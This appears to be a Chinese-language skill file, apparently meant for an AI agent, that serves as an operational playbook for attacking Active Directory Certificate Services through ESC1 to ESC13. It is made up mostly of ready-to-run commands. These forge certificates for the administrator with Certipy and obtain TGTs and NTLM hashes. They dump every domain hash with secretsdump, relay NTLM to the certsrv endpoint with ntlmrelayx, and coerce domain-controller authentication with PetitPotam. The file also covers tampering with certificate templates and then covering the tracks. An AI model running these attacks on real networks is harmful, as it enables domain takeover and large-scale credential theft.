---
name: 武庸·印绶
description: >-
 Active Directory 证书服务（AD CS）攻击：ESC1-ESC13 漏洞利用、
 Certipy 枚举与利用、证书请求伪造、NTLM Relay 到 AD CS。
 
version: 1.0.0
---

> **武庸**
> 永生缥缈非我求，长生无为老愧羞。
> 凡夫俗子岂识我，非到末路不甘休！

# AD CS 证书服务攻击（ESC1-ESC13）

## 触发条件

：
- AD CS、Active Directory Certificate Services
- ESC1–ESC13、ESC8 Web Enrollment、ESC13 签发策略组
- Certipy、Certify.exe
- 证书模板滥用、证书伪造
- NTLM Relay → AD CS
- 用证书登录 AD

---

## 1. 环境枚举

```bash
# ── Certipy（推荐，Python）──
pip install certipy-ad

# 枚举所有证书模板
certipy find -u lowpriv@corp.local -p 'Password1' -dc-ip <DC_IP> -stdout
certipy find -u lowpriv@corp.local -p 'Password1' -dc-ip <DC_IP> -vulnerable # 只显示存在漏洞的

# 输出到 BloodHound 格式
certipy find -u lowpriv@corp.local -p 'Password1' -dc-ip <DC_IP> -bloodhound
```

```powershell
# ── Certify.exe（域内 Windows）──
.\Certify.exe find /vulnerable
.\Certify.exe cas # 枚举 CA 服务器
.\Certify.exe find /enrolleeSuppliesSubject # ESC1 相关
```

---

## 2. ESC1 — 证书模板 UPN/SAN 可控

**条件**：模板允许申请者在证书中指定任意 Subject Alternative Name（SAN/UPN），且 Enrollment Rights 允许低权限用户注册。

```bash
# 1. 枚举可利用模板（Certipy 标记 ESC1）
certipy find -u lowpriv@corp.local -p 'Pass' -dc-ip <DC_IP> -vulnerable

# 2. 申请证书，SAN 指定 Administrator
certipy req -u lowpriv@corp.local -p 'Pass' \
 -ca 'CORP-CA' \
 -template 'VulnerableTemplate' \
 -upn administrator@corp.local \
 -dc-ip <DC_IP>
# 输出：administrator.pfx

# 3. 用证书申请 TGT
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# 输出：administrator.ccache + NTLM hash

# 4. 使用 TGT
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass corp.local/administrator@<DC_IP>
```

---

## 3. ESC2 — 任意用途证书模板

**条件**：模板标记为 Any Purpose 或 SubCA，且低权用户可注册。

```bash
# 申请 Any Purpose 证书
certipy req -u lowpriv@corp.local -p 'Pass' \
 -ca 'CORP-CA' -template 'AnyPurposeTemplate' -dc-ip <DC_IP>

# 用该证书再申请 ESC3 链或直接 auth
certipy auth -pfx lowpriv.pfx -dc-ip <DC_IP>
```

---

## 4. ESC3 — 注册代理证书

**条件**：模板允许代表其他用户申请证书。分两步：

```bash
# Step 1: 申请注册代理证书
certipy req -u lowpriv@corp.local -p 'Pass' \
 -ca 'CORP-CA' -template 'EnrollmentAgentTemplate' -dc-ip <DC_IP>
# 输出：lowpriv.pfx（注册代理证书）

# Step 2: 代表 Administrator 申请用户证书
certipy req -u lowpriv@corp.local -p 'Pass' \
 -ca 'CORP-CA' -template 'User' \
 -on-behalf-of 'corp\administrator' \
 -pfx lowpriv.pfx -dc-ip <DC_IP>
# 输出：administrator.pfx

certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## 5. ESC4 — 证书模板 ACL 可写

**条件**：低权用户对证书模板有 WriteProperty/WriteDACL 权限。

```bash
# 枚举可写模板（Certipy 标记 ESC4）
certipy find -u lowpriv@corp.local -p 'Pass' -dc-ip <DC_IP> -vulnerable

# 修改模板属性（使其变为 ESC1）
certipy template -u lowpriv@corp.local -p 'Pass' \
 -template 'VulnerableTemplate' -save-old \
 -dc-ip <DC_IP>

# 然后按 ESC1 步骤申请证书...

# 恢复原始模板（痕迹清理）
certipy template -u lowpriv@corp.local -p 'Pass' \
 -template 'VulnerableTemplate' -configuration VulnerableTemplate.json \
 -dc-ip <DC_IP>
```

---

## 6. ESC6 — CA 允许 EDITF_ATTRIBUTESUBJECTALTNAME2

**条件**：CA 开启了 EDITF_ATTRIBUTESUBJECTALTNAME2 标志，任何证书请求都可以指定 SAN。

```bash
# 检测
certipy find -u lowpriv@corp.local -p 'Pass' -dc-ip <DC_IP> -stdout | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"

# 利用（申请任意 SAN）
certipy req -u lowpriv@corp.local -p 'Pass' \
 -ca 'CORP-CA' -template 'User' \
 -upn administrator@corp.local \
 -dc-ip <DC_IP>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## 7. ESC8 — NTLM Relay 到 AD CS Web Enrollment

**条件**：AD CS 的 Web Enrollment 端点（http://CA/certsrv/）启用且不要求 HTTPS（无 EPA）。

```bash
# 1. 启动 NTLM Relay（目标：certsrv 端点）
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp \
 --adcs --template 'DomainController' -smb2support

# 2. 触发目标机器向攻击机发出 NTLM 认证
# 方法一：Responder（同网段内）
responder -I eth0 -rdw

# 方法二：PetitPotam（强制 DC 认证）
python3 PetitPotam.py -d corp.local -u lowpriv -p 'Pass' <攻击机IP> <DC_IP>

# 3. ntlmrelayx 捕获并 relay，输出 base64 证书

# 4. 解码证书并认证
certipy auth -pfx dc.pfx -dc-ip <DC_IP>
# 得到 DC 机器账户 hash → DCSync
secretsdump.py -hashes :<ntlm_hash> 'corp.local/DC01$'@<DC_IP>
```

---

## 8. 从证书到 DA（汇总）

```
ESC1/ESC2/ESC3/ESC6
 → certipy req → administrator.pfx
 → certipy auth → TGT + NTLM hash
 → secretsdump → 全域 hash 转储

ESC8（NTLM Relay）
 → 捕获 DC$ 凭证 → DC 机器账户证书
 → certipy auth → DC NTLM hash
 → DCSync（secretsdump）
```

---

## 9. 快速检查命令

```bash
# 一键扫描所有 ESC
certipy find -u 'lowpriv@corp.local' -p 'Password1' -dc-ip <DC_IP> -vulnerable -stdout 2>/dev/null | grep -E "ESC|Template|Enabled"
```

## 10. ESC9–ESC13（Certipy `-vulnerable` 先扫）

| ESC | 条件摘要 | 动作 |
|-----|----------|------|
| ESC9 | 模板 `StrongCertificateBindingEnforcement` 弱 + `noSecurityExtension` | 改 UPN → 申请 → 还原 UPN → 用票 |
| ESC10 | 证书映射弱（`CertificateMappingMethods` / UPN 映射） | 伪造映射打 LDAP |
| ESC11 | ICPR 无加密，可中继到 CA | `ntlmrelayx` → ICPR |
| ESC12 | ADCS 壳扩展 / YAMA 类滥用 | 按 Certipy 提示模板利用 |
| ESC13 | 模板签发策略绑定高权限组 | 申请该模板证书 → 进组 → 提权 |

```bash
certipy find -u 'lowpriv@corp.local' -p 'Password1' -dc-ip <DC_IP> -vulnerable -stdout
# 命中 ESC13：看 Issuance Policies / 组 SID，再 certipy req -template <名>
```

配套：`windows-ad-pentest` · `kerberos-attack` · `smb-lateral-movement`

## 真源

- 手法：`传承/宗门·认族.md`
- 工具：`python3 炼蛊房/ad_surface_check.py --help`
